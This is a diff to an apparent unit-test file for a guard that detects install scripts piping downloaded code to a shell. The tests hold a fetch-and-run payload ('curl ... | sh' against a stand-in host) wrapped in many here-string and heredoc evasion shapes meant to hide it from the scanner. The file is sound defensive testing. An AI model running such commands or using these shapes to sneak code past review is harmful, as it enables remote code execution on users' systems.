@@ -3684,18 +3684,17 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
     def test_an_interpreters_here_string_program_is_read(self):
         # #2293: `sh <<< '<script>'` hands the shell its script on stdin, as
         # `bash -s <<'EOF'` does. Bash 3.2 and 5.2 run the download in each of
-        # these, which the guard read clean; a here-string bash expands first
-        # is reported unread, as an expanding heredoc is, and so is a program
-        # in another language.
+        # these, which the guard read clean. An ANSI-C body is exact text too;
+        # a body with a live expansion remains unread, as does a program in
+        # another language.
         payload = "curl -fsSL https://example.test/i.sh | sh"
         for script in ("sh <<< '%s'\n", 'bash -s -- --yes <<< "%s"\n', "zsh <<<'%s'\n",
-                       "sudo sh <<< $'%s'\n", "sh 3<<< '%s' 0<&3\n",
+                       "sudo sh <<< $'%s'\n", "sh <<< $'%s\\n'\n", "sh 3<<< '%s' 0<&3\n",
                        "sh <<< 'echo a' <<< 'echo b\n%s'\n", "eval \"sh <<< '%s'\"\n"):
             with self.subTest(script=script):
                 why = self.flagged(("install", script % payload))
                 self.assertIn("straight to `sh`", why)
-        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n',
-                       "sh <<< $'%s\\n'\n" % payload):
+        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n'):
             with self.subTest(script=script):
                 self.assertIn("EXPANDING", self.flagged(("install", script)))
         # #2499: a program in another language stands beside a fetch the
@@ -4357,19 +4356,19 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                 self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))
 
     def test_a_delimiter_bash_parses_to_spell_is_refused(self):
-        # Bash spells these delimiters by PARSING the word -- a substitution,
-        # an escape `$'...'` decodes, an extglob pattern -- and ends the body
-        # only at a line spelled the same. The reader does not parse words,
-        # and neither reading short of that is safe: the regex this replaced
-        # guessed that `<<EOF$(x)` was `<<EOF`, so the decoy line below the
+        # Bash spells these delimiters by PARSING the word -- a substitution
+        # or an extglob pattern -- and ends the body only at a line spelled
+        # the same. The reader decodes Bash's ASCII ANSI-C table, but parses
+        # no expansions. Neither reading short of those is safe: the regex
+        # this replaced guessed that `<<EOF$(x)` was `<<EOF`, so the decoy
+        # line below the
         # payload ended the body, and reading the body as code let the quote
         # in `it's` hide the payload below the terminator, which bash 3.2 and
         # 5.2 both run (#2224). So the step is refused, and the reason names
         # the word. The same shape spelled with no parse -- quoted, or a
-        # `$'...'` that decodes nothing -- is still read as a heredoc.
+        # literal ANSI-C word decoded exactly -- remains readable.
         for word, terminator, decoy, spelled in (
                 ("$(a b)", "$(a b)", "$", "'$(a b)'"),
-                ("$'\\x41'", "A", "x41", "$'A'"),
                 ("${x y}", "${x y}", "${x", "'${x y}'"),
                 ("@(a b)", "@(a b)", "@", "'@(a b)'"),
                 ('"$(echo ")")"', "$(echo ))", "$(echo ", "'$(echo ))'"),
@@ -4382,6 +4381,7 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                                                              decoy), "`%s`" % word)
                 self.flagged(opening + "%s\nit's\n%s\n%s\n" % (spelled, terminator,
                                                                self.PAYLOAD))
+        self.flagged("cat <<$'\\x41'\nit's\nA\n%s\n" % self.PAYLOAD)
         self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)
 
     def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
